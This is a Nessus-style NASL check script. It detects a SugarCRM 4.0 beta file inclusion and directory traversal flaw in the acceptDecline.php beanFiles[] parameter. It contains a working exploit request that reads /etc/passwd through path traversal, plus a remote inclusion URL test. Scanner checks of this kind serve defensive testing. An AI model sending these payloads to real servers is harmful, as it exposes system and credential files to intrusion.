#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

if (description) {
script_id(20286);
script_version("$Revision: 1.5 $");

script_cve_id("CVE-2005-4087",
              "CVE-2005-4086");
script_bugtraq_id(15760);

name["english"] = "SugarCRM <= 4.0 beta Remote File Inclusion Vulnerability";
script_name(english:name["english"]);

desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is prone to 
multiple flaws.

Description :

SugarCRM is a Customer Relationship Manager written in PHP.

The version of SugarCRM installed on the remote host
does not properly sanitize user input
in the 'beanFiles[]' parameter in the 'acceptDecline.php' 
file. A attacker can use this flaw to display sensitive 
information and to include malicious code wich can be used 
to execute arbitrary commands. 

This vulnerability exists if 'register_globals' is enabled.

See also :

http://retrogod.altervista.org/sugar_suite_40beta.html
http://marc.theaimsgroup.com/?l=bugtraq&m=113397762406598&w=2

Solution :

Upgrade to Sugar Suite version 3.5.1e and/or disable PHP's 
'register_globals' setting.

Risk factor :

Medium / CVSS Base Score : 4.8
(AV:L/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
script_description(english:desc["english"]);

summary["english"] = "Check if SugarCRM is vulnerable to Directory Traversal and Remote File Inclusion";
script_summary(english:summary["english"]);

script_category(ACT_ATTACK);
script_family(english:"CGI abuses");

script_copyright(english:"This script is Copyright (C) 2005 Ferdy Riphagen");

script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");

port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);

if (thorough_tests) dirs = make_list("/sugarsuite", "/sugarcrm", "/crm", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{ 
  string[0] = "../../../../../../../../etc/passwd";
  if ( thorough_tests )
	{
  	string[1] = string("http://", get_host_name(), "/robots.txt");
	pat =  "root:.*:0:[01]:.*:|User-agent:";
	}
   else
	pat = "root:.*:0:[01]:.*:";
 
  for(exp = 0; string[exp]; exp++)
  {
   req = http_get(item:string(dir, "/acceptDecline.php?beanFiles[1]=", string[exp], "&beanList[1]=1&module=1"), port:port);
   recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if(recv == NULL)exit(0);
   
   if( egrep(pattern: pat, string:recv))
   {
    security_warning(port);
    exit(0);
   }
  }
}
